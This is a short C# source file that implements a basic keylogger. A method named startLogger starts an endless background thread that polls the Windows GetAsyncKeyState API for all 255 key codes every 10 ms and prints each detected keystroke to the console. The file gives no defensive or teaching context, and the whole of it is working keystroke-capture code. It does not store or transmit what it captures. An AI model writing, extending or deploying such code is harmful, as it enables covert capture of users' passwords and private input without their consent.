using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace listener
{
    public class Class1
    {
        [DllImport("user32.dll")] public static extern int GetAsyncKeyState(Int32 i);

        public static void startLogger()
        {
            KeysConverter converter = new KeysConverter();

            new Thread(() =>
            {
                while (true)
                {
                    Thread.Sleep(10);

                    for (Int32 i = 0; i < 255; i++)
                    {
                        int key = GetAsyncKeyState(i);

                        if (key == 1 || key == -32767)
                        {
                            Console.WriteLine(converter.ConvertToString(i));
                            break;
                        }
                    }
                }
            }).Start();
        }
    }
}
